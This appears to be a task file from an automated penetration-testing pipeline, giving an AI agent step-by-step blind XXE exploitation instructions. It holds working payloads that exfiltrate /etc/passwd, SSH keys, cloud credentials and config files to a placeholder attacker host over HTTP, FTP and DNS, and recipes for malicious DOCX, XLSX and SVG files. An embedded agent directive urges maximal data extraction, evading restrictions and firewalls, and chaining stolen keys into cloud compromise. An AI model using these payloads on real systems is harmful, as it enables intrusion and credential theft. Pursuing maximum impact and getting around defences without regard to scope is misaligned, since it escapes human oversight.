================================================================================
TASK 53 â€” BLIND XXE EXPLOITATION & FILE CRAFTING
================================================================================
Covers testing_toolkit.txt Phase 5 Step 16 (Exploitation)
Requires: Task 52 outputs (confirmed blind XXE endpoints)

OBJECTIVE
â”€â”€â”€â”€â”€â”€â”€â”€â”€
Exploit confirmed XXE vulnerabilities to:
- Extract sensitive files via OOB exfiltration
- Craft malicious Office documents (DOCX/XLSX)
- Create XXE-embedded SVG files
- Set up external DTD server for data extraction

================================================================================
                              INPUT FILES
================================================================================
PRIMARY (from Task 52):
  outputs/xxe/task53_targets.json             â† blind XXE endpoints
  outputs/xxe/xxe_blind_candidates.json       â† suspected blind XXE
  outputs/xxe/xml_endpoints.txt               â† all XML endpoints

SECONDARY:
  outputs/xxe/upload_xxe_candidates.txt       â† file upload points
  outputs/xxe/soap_endpoints.txt              â† SOAP services

INTELLIGENCE:
  outputs/nuclei/tech_stack.json              â† tech stack
  outputs/waf_summary.json                    â† bypass techniques

================================================================================
                             OUTPUT FILES
================================================================================
outputs/xxe/
â”œâ”€â”€ extracted_files/              â† files extracted via XXE
â”‚   â”œâ”€â”€ etc_passwd.txt
â”‚   â”œâ”€â”€ etc_shadow.txt
â”‚   â””â”€â”€ app_config.txt
â”œâ”€â”€ crafted_payloads/             â† malicious files created
â”‚   â”œâ”€â”€ xxe.docx
â”‚   â”œâ”€â”€ xxe.xlsx
â”‚   â””â”€â”€ xxe.svg
â”œâ”€â”€ exploitation_results.json     â† successful exploits
â”œâ”€â”€ exfiltrated_data.json         â† data extracted via OOB
â”œâ”€â”€ dtd_server_log.txt            â† external DTD server log
â””â”€â”€ vulnerabilities/
    â””â”€â”€ XXE-XXXX-CRITICAL.md      â† individual vuln reports

================================================================================
                    BLIND XXE EXPLOITATION
================================================================================

SECTION 1: EXTERNAL DTD SETUP
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
You need a DTD server for blind XXE data exfiltration.

OPTION A: xxeserv (recommended)
```bash
# Start xxeserv DTD server
xxeserv -p 8080 -o exfil_data.txt

# It will serve DTD and receive exfiltrated data
# Access at: http://YOUR_IP:8080/xxe.dtd
```

OPTION B: Python Simple Server + Custom DTD
```bash
# Create malicious DTD file
cat > xxe.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_IP:8080/?data=%file;'>">
%eval;
%exfil;
EOF

# Start server
python3 -m http.server 8080
```

OPTION C: Interactsh for DNS exfil
```bash
# Use Interactsh subdomain for DNS-based exfil
# Data appears in DNS queries
```

SECTION 2: BLIND XXE PAYLOAD (External DTD)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Payload to send to vulnerable endpoint

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR_DTD_SERVER:8080/xxe.dtd">
  %xxe;
]>
<root>test</root>

# The DTD server returns:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_IP:8080/?data=%file;'>">
%eval;
%exfil;

# Parser fetches DTD â†’ reads file â†’ sends to YOUR_IP

SECTION 3: OOB DATA EXFILTRATION VARIATIONS
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# HTTP exfiltration
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_IP/?d=%file;'>">
%eval;
%exfil;

# FTP exfiltration (for multiline files)
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://YOUR_IP:21/%file;'>">
%eval;
%exfil;

# DNS exfiltration (limited data, but works through firewalls)
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.YOUR_DOMAIN/'>">
%eval;
%exfil;

================================================================================
                    FILES TO EXTRACT
================================================================================

CRITICAL FILES (extract first):
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Linux
/etc/passwd
/etc/shadow (if accessible)
/etc/hostname
/etc/hosts
/proc/self/environ          â† environment variables (AWS keys!)
/proc/self/cmdline          â† running command
/home/*/.ssh/id_rsa         â† SSH private keys
/home/*/.bash_history

# Windows
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Users\*\.ssh\id_rsa
C:\inetpub\wwwroot\web.config

# Web application configs
/var/www/html/wp-config.php
/var/www/html/.env
/var/www/html/config/database.yml
/app/config/parameters.yml
/opt/app/application.properties

# Cloud credentials
/root/.aws/credentials
/home/*/.aws/credentials
/root/.gcloud/credentials.db

================================================================================
                    OFFICE DOCUMENT XXE
================================================================================

DOCX XXE (using oxml_xxe):
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# oxml_xxe injects XXE into Office documents

# Create malicious DOCX
oxml_xxe --docx --payload "<!ENTITY xxe SYSTEM 'http://YOUR_INTERACTSH.oast.fun/docx-xxe'>" --output xxe.docx

# Or manually:
# 1. Create normal DOCX
# 2. Unzip: unzip document.docx -d docx_extracted/
# 3. Edit docx_extracted/[Content_Types].xml or word/document.xml
# 4. Add XXE payload
# 5. Rezip: cd docx_extracted && zip -r ../xxe.docx *

MANUAL DOCX XXE INJECTION:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# In [Content_Types].xml or word/document.xml:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR_IP:8080/xxe-docx">
]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <!-- original content + &xxe; somewhere -->
</Types>

XLSX XXE:
â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Similar to DOCX - XLSX is also a ZIP with XML files

oxml_xxe --xlsx --payload "<!ENTITY xxe SYSTEM 'http://YOUR_IP/xlsx-xxe'>" --output xxe.xlsx

# Key files to inject in XLSX:
# - [Content_Types].xml
# - xl/workbook.xml
# - xl/sharedStrings.xml

================================================================================
                    SVG XXE EXPLOITATION
================================================================================

BASIC SVG XXE:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="10" y="50" font-size="16">&xxe;</text>
</svg>

SVG XXE WITH OOB:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY % xxe SYSTEM "http://YOUR_DTD_SERVER:8080/xxe.dtd">
  %xxe;
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="10" y="50">XXE Test</text>
</svg>

SVG XXE VIA XLINK (sometimes works when entities blocked):
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="500" height="500">
  <image xlink:href="http://YOUR_IP/svg-xlink" width="100" height="100"/>
</svg>

================================================================================
                    XXESERV COMMANDS
================================================================================

BASIC USAGE:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Start server on port 8080
xxeserv -p 8080

# With output file
xxeserv -p 8080 -o exfiltrated.txt

# Custom DTD path
xxeserv -p 8080 -d /path/to/custom.dtd

XXESERV DTD GENERATION:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# xxeserv auto-generates DTD for common files
# Access: http://YOUR_IP:8080/xxe.dtd?file=/etc/passwd

# Custom file extraction
http://YOUR_IP:8080/xxe.dtd?file=/var/www/html/wp-config.php

FTP EXFIL MODE:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# For multiline files, use FTP mode
xxeserv --ftp -p 21 -o ftp_exfil.txt

# DTD for FTP exfil:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://YOUR_IP:21/%file;'>">
%eval;
%exfil;

================================================================================
                    EXPLOITATION WORKFLOW
================================================================================
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 1: Set Up Exfiltration Server                                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ â€¢ Start xxeserv on attacker server                                          â”‚
â”‚ â€¢ Or use Interactsh for OOB detection                                       â”‚
â”‚ â€¢ Note your external IP/domain                                              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 2: Confirm Blind XXE Works                                             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ â€¢ Send external DTD payload to Task 52 confirmed endpoints                  â”‚
â”‚ â€¢ Check xxeserv/Interactsh for callbacks                                    â”‚
â”‚ â€¢ Callback = working, proceed to extraction                                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 3: Extract Critical Files                                              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ â€¢ /etc/passwd (user enumeration)                                            â”‚
â”‚ â€¢ /proc/self/environ (environment variables, AWS keys)                      â”‚
â”‚ â€¢ Application config files (database creds)                                 â”‚
â”‚ â€¢ SSH keys if accessible                                                    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 4: Craft Malicious Files (if upload XXE)                               â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ â€¢ Create XXE-embedded DOCX using oxml_xxe                                   â”‚
â”‚ â€¢ Create XXE-embedded XLSX                                                  â”‚
â”‚ â€¢ Create malicious SVG                                                      â”‚
â”‚ â€¢ Upload and check for callbacks                                            â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STEP 5: Report & Document                                                   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ â€¢ Save extracted data                                                       â”‚
â”‚ â€¢ Generate vulnerability reports                                            â”‚
â”‚ â€¢ Document attack chain and impact                                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

================================================================================
                     AI AGENT CREATIVITY DIRECTIVE
================================================================================
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    ğŸ§  YOU ARE AN INTELLIGENT AGENT ğŸ§                        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Blind XXE exploitation requires PATIENCE and CREATIVITY.                    â”‚
â”‚                                                                             â”‚
â”‚ MAXIMIZE DATA EXTRACTION:                                                   â”‚
â”‚                                                                             â”‚
â”‚ 1. START WITH SMALL FILES                                                   â”‚
â”‚    - /etc/hostname first (single line, confirms exfil works)                â”‚
â”‚    - Then /etc/passwd (multi-line, tests encoding)                          â”‚
â”‚    - Then larger config files                                               â”‚
â”‚                                                                             â”‚
â”‚ 2. HANDLE MULTILINE FILES                                                   â”‚
â”‚    - HTTP exfil often fails with newlines                                   â”‚
â”‚    - Use FTP exfil for multiline: ftp://your-server/%file;                  â”‚
â”‚    - Or use PHP filter: php://filter/convert.base64-encode/...              â”‚
â”‚                                                                             â”‚
â”‚ 3. WORK AROUND RESTRICTIONS                                                 â”‚
â”‚    - If file:// blocked â†’ try php://filter, jar:, netdoc:                   â”‚
â”‚    - If external DTD blocked â†’ try error-based exfil                        â”‚
â”‚    - If HTTP blocked â†’ try DNS exfil or FTP                                 â”‚
â”‚                                                                             â”‚
â”‚ THINK ABOUT FILE LOCATIONS:                                                 â”‚
â”‚                                                                             â”‚
â”‚ â€¢ Java app? â†’ /opt/app/application.properties, WEB-INF/web.xml              â”‚
â”‚ â€¢ PHP app? â†’ /var/www/html/config.php, .env                                 â”‚
â”‚ â€¢ Python app? â†’ /app/config.py, /app/.env, requirements.txt                 â”‚
â”‚ â€¢ .NET app? â†’ web.config, appsettings.json                                  â”‚
â”‚                                                                             â”‚
â”‚ CHAIN TO MAXIMUM IMPACT:                                                    â”‚
â”‚                                                                             â”‚
â”‚ â€¢ /proc/self/environ â†’ AWS_ACCESS_KEY_ID â†’ Cloud compromise                 â”‚
â”‚ â€¢ Database config â†’ Credentials â†’ SQL access                                â”‚
â”‚ â€¢ SSH keys â†’ Server access                                                  â”‚
â”‚ â€¢ Source code â†’ More vulnerabilities                                        â”‚
â”‚                                                                             â”‚
â”‚ FILE UPLOAD XXE THINKING:                                                   â”‚
â”‚                                                                             â”‚
â”‚ â€¢ DOCX/XLSX uploads â†’ oxml_xxe to inject payload                            â”‚
â”‚ â€¢ SVG uploads â†’ Direct XML, often processed server-side                     â”‚
â”‚ â€¢ "Import" features â†’ Often parse XML without validation                    â”‚
â”‚ â€¢ PDF uploads â†’ Some PDF libs parse embedded XML                            â”‚
â”‚                                                                             â”‚
â”‚ If one exfil method fails, TRY ANOTHER. Firewalls may block HTTP but        â”‚
â”‚ allow DNS. Parsers may block entities but allow XInclude.                   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

ADVANCED TECHNIQUES:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1. XInclude (when DOCTYPE disabled):
   <foo xmlns:xi="http://www.w3.org/2001/XInclude">
     <xi:include href="file:///etc/passwd" parse="text"/>
   </foo>

2. XSLT (if XSLT processing enabled):
   <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
     <xsl:template match="/">
       <xsl:value-of select="document('file:///etc/passwd')"/>
     </xsl:template>
   </xsl:stylesheet>

3. Parameter entity trick for PHP:
   <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">

================================================================================
                              SEVERITY RATINGS
================================================================================
CRITICAL:
- Extracted AWS/cloud credentials
- Extracted database passwords
- Extracted SSH private keys
- Extracted source code with secrets

HIGH:
- File read on server (/etc/passwd, configs)
- SSRF via XXE to internal services
- Data exfiltration confirmed

MEDIUM:
- Blind XXE confirmed (no data extracted yet)
- XXE in file upload (needs manual exploit)

================================================================================
                                  NOTES
================================================================================
- xxeserv must be accessible from target server (firewall rules!)
- FTP exfil is more reliable for multiline files
- Base64 encoding handles special characters better
- Some parsers disable external entities by default - check version
- Office XXE often triggers on "preview" or "import" not just upload
- Error messages may leak data even when exfil blocked
================================================================================
